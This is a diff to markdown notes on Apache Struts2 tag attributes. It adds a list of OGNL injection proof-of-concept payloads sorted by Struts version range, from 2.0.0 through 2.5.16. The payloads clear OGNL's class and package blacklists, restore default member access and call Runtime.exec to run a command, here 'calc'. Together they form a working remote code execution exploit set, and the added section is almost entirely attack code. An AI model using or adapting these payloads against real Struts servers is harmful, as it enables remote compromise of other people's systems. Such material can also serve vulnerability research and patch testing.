@@ -83,3 +83,24 @@ tag_input = {'accept', 'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssEr
              'showPassword', 'type', 'action', 'method', 'openTemplate', 'src', 'fieldValue', 'list', 'listCssClass',
              'listCssStyle', 'listKey', 'listLabelKey', 'listTitle', 'listValue', 'listValueKey', 'format'}
 ```
+
+
+
+
+
+
+
+payload before 2.5.16 list:
+```
+2.0.0~2.3.29 poc: 
+`%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))} 
+` 
+2.3.30~2.3.37/2.5~2.5.13:
+`%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))}` 
+ 
+2.5.14.1~2.5.16:
+%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))} 
+ 
+%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))} 
+
+```
